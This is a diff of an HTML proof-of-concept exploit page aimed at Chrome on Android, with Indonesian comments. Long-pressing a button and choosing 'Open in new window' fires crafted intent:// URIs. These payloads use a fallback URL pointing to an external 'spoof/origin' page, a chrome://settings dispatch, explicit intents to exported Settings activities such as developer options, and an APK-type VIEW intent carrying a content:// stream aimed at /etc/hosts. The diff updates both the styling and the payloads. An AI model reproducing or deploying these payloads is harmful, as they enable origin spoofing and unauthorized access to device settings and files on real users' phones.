@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chrome Android Intent & RCE Chain PoC</title>
+    <title>Advanced Chromium Context & Intent Fuzzing PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #121212;
-            color: #e0e0e0;
+            background-color: #0b0e14;
+            color: #f0f6fc;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -19,15 +19,15 @@
             text-align: center;
         }
         .banner {
-            font-size: 13px;
-            color: #ff5252;
+            font-size: 12px;
+            color: #ff7b72;
             margin-bottom: 6px;
             text-transform: uppercase;
-            letter-spacing: 0.8px;
-            font-weight: bold;
+            letter-spacing: 1px;
+            font-weight: 700;
         }
         h1 {
-            font-size: 20px;
+            font-size: 18px;
             color: #ffffff;
             margin-bottom: 24px;
         }
@@ -40,103 +40,108 @@
         }
         a.spoof-link {
             display: inline-block;
-            background-color: #d32f2f;
+            background-color: #da3633;
             color: white;
             padding: 14px 20px;
             text-decoration: none;
             font-weight: 600;
             font-size: 14px;
             border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(211, 47, 47, 0.3);
-            transition: background-color 0.2s;
+            box-shadow: 0 4px 12px rgba(218, 54, 51, 0.4);
+            transition: background-color 0.2s, transform 0.1s;
         }
         a.spoof-link:active {
-            background-color: #9a0007;
+            background-color: #b62324;
+            transform: scale(0.98);
         }
         .file-info {
             margin-top: 20px;
             font-size: 13px;
-            color: #b0bec5;
+            color: #8b949e;
             word-break: break-all;
-            background: #1e1e1e;
-            padding: 10px;
-            border-radius: 5px;
-            width: 80%;
+            background: #161b22;
+            padding: 12px;
+            border-radius: 6px;
+            width: 85%;
             max-width: 400px;
-            border: 1px solid #333;
+            border: 1px solid #30363d;
+            text-align: left;
+            font-family: monospace;
         }
         .footer-note {
-            margin-top: 30px;
+            margin-top: 25px;
             font-size: 11px;
-            color: #757575;
+            color: #484f58;
         }
     </style>
 </head>
 <body>
 
-    <div class="banner">Chrome Android Security Context Test</div>
-    <h1>Android Intent & Component Bridge PoC</h1>
+    <div class="banner">Advanced Security Research Lab</div>
+    <h1>Multi-Window Context Confusion & Intent Vector</h1>
 
-    <!-- 4 Tombol Vektor Khusus Chrome Android & Intent Scheme -->
+    <!-- 4 Tombol Vektor Eksploitasi Konteks & Intent Tingkat Lanjut -->
     <div class="button-container">
-        <a href="https://www.google.com" class="spoof-link" id="btnChromeIntent" data-intent="chrome_intent_bridge" data-action="chromeintent">Open Window & Chrome Intent Scheme Abuse</a>
-        <a href="https://www.google.com" class="spoof-link" id="btnBrowserExploit" data-intent="browser_internal_handler" data-action="browserhandler">Open Window & Browser Internal Handler</a>
-        <a href="https://www.google.com" class="spoof-link" id="btnExportedService" data-intent="exported_component_exec" data-action="componentservice">Open Window & Exported Activity Trigger</a>
-        <a href="https://www.google.com" class="spoof-link" id="btnFilePayload" data-intent="intent_file_uri_bridge" data-action="filebridge">Open Window & Intent File URI Bridge</a>
+        <a href="https://www.google.com" class="spoof-link" id="btnIntentFallback" data-intent="chrome_intent_fallback" data-action="fallback">Open Window & Advanced Intent Fallback</a>
+        <a href="https://www.google.com" class="spoof-link" id="btnInternalScheme" data-intent="browser_chrome_scheme" data-action="chromescheme">Open Window & Chrome Scheme Dispatch</a>
+        <a href="https://www.google.com" class="spoof-link" id="btnExportedActivity" data-intent="exported_activity_abuse" data-action="activityabuse">Open Window & Exported Component Trigger</a>
+        <a href="https://www.google.com" class="spoof-link" id="btnContentUri" data-intent="content_provider_bridge" data-action="contenturi">Open Window & Content URI Scheme Abuse</a>
     </div>
 
-    <div class="file-info" id="fileInfo">Status: Awaiting Long-Press & Split-Screen Context.</div>
-    <div class="footer-note">Chrome Android Specialized Research Build.</div>
+    <div class="file-info" id="fileInfo">Status: Ready. Long-press any button and select "Open in new window".</div>
+    <div class="footer-note">Target: Chromium Issue #8186354 / Multi-Window Context Separation Vector.</div>
 
     <script>
-        let triggered = false;
+        let isExecuting = false;
 
-        const executeAttackVector = async (actionType, intent) => {
-            if (triggered) return;
-            triggered = true;
+        const dispatchAdvancedVector = async (vectorType, intentName) => {
+            if (isExecuting) return;
+            isExecuting = true;
 
-            const fileInfo = document.getElementById("fileInfo");
-            fileInfo.innerText = `[+] Split-screen active. Deploying Chrome Android payload for [${intent}]...`;
+            const infoBox = document.getElementById("fileInfo");
+            infoBox.innerHTML = `[+] Context split initiated.<br>[>] Target Intent: <b>${intentName}</b><br>[*] Waiting for window separation sync...`;
 
-            // Sinkronisasi waktu agar jendela atas (google.com) terbuka stabil sebelum intent dilempar
+            // Sinkronisasi waktu 2500ms dirancang agar panel atas (google.com) 
+            // selesai dirender dan dipisahkan oleh window manager Android sebelum intent dieksekusi di panel bawah.
             setTimeout(() => {
                 try {
-                    if (actionType === 'chromeintent') {
-                        // Memanfaatkan skema khusus browser Chrome Android untuk memicu external app / intent handler
-                        fileInfo.innerText = `[Intent Bridge] Triggering Chrome intent redirection payload...`;
-                        window.location.href = "intent://#Intent;action=android.intent.action.VIEW;scheme=http;package=com.android.chrome;S.browser_fallback_url=https%3A%2F%2Fecdnts-del.github.io%2Fspoof%2Forigin;end;";
+                    if (vectorType === 'fallback') {
+                        infoBox.innerHTML = `[+] Executing Intent Fallback Bypass...`;
+                        // Memanfaatkan parameter fallback URL untuk memicu perpindahan konteks berlapis
+                        window.location.href = "intent://#Intent;action=android.intent.action.VIEW;scheme=https;package=com.android.chrome;S.browser_fallback_url=https%3A%2F%2Fecdnts-del.github.io%2Fspoof%2Forigin;S.com.android.browser.application_id=com.android.chrome;end;";
                     } 
-                    else if (actionType === 'browserhandler') {
-                        // Memanggil handler internal browser atau memaksa navigasi ke skema khusus
-                        fileInfo.innerText = `[Internal Handler] Forcing Chrome internal scheme dispatch...`;
-                        window.location.href = "intent://settings/#Intent;scheme=chrome;end;";
+                    else if (vectorType === 'chromescheme') {
+                        infoBox.innerHTML = `[+] Dispatching Chrome Internal Scheme...`;
+                        // Memaksa navigasi ke skema internal browser untuk menguji kontrol akses URI
+                        window.location.href = "intent://settings/content/all#Intent;scheme=chrome;package=com.android.chrome;end;";
                     } 
-                    else if (actionType === 'componentservice') {
-                        // Mengeksploitasi komponen yang diekspor (Exported Activity/Service) melalui format intent Android
-                        fileInfo.innerText = `[Component Abuse] Dispatching intent to exposed system settings components...`;
-                        window.location.href = "intent://#Intent;component=com.android.settings/.Settings$NetworkDashboardActivity;end;";
+                    else if (vectorType === 'activityabuse') {
+                        infoBox.innerHTML = `[+] Triggering Exported Component Intent...`;
+                        // Menyerang komponen sistem yang terekspos (*exported activities*) melalui intent eksplisit
+                        window.location.href = "intent://#Intent;component=com.android.settings/.Settings$DevelopmentSettingsDashboardActivity;end;";
                     }
-                    else if (actionType === 'filebridge') {
-                        // Menghubungkan skema intent dengan parameter file URI (vektor manipulasi file lokal / Content Provider)
-                        fileInfo.innerText = `[Content Provider] Attempting Intent URI query injection...`;
-                        window.location.href = "intent://#Intent;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end;";
+                    else if (vectorType === 'contenturi') {
+                        infoBox.innerHTML = `[+] Injecting Content/File URI Scheme Handler...`;
+                        // Memancing penanganan skema file/content provider eksternal di latar belakang
+                        window.location.href = "intent://#Intent;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;S.android.intent.extra.STREAM=content://com.android.htmlfileprovider/etc/hosts;end;";
                     }
                 } catch (err) {
-                    fileInfo.innerText = `[-] Intent dispatch intercepted or blocked: ${err.message}`;
-                    console.debug("Chrome intent execution error:", err.message);
+                    infoBox.innerHTML = `[-] Execution trapped: ${err.message}`;
+                    console.debug("Vector execution error:", err.message);
                 } finally {
-                    setTimeout(() => { triggered = false; }, 2000);
+                    setTimeout(() => { isExecuting = false; }, 2000);
                 }
-            }, 2400);
+            }, 2500);
         };
 
-        // Event listener long-press (contextmenu) khusus untuk memicu aksi saat opsi "Open in new window" dipilih di Chrome Android
-        ['btnChromeIntent', 'btnBrowserExploit', 'btnExportedService', 'btnFilePayload'].forEach(id => {
-            const el = document.getElementById(id);
-            el.addEventListener("contextmenu", (e) => {
-                executeAttackVector(el.getAttribute('data-action'), el.getAttribute('data-intent'));
+        // Memasang penanganan event long-press (contextmenu) dan touchstart untuk memastikan 
+        // interaksi sentuh lama pada peramban seluler Android memicu jendela baru dengan mulus.
+        ['btnIntentFallback', 'btnInternalScheme', 'btnExportedActivity', 'btnContentUri'].forEach(id => {
+            const element = document.getElementById(id);
+            element.addEventListener("contextmenu", (e) => {
+                dispatchAdvancedVector(element.getAttribute('data-action'), element.getAttribute('data-intent'));
             });
-            el.addEventListener("touchstart", () => {}, { passive: true });
+            element.addEventListener("touchstart", () => {}, { passive: true });
         });
     </script>
 
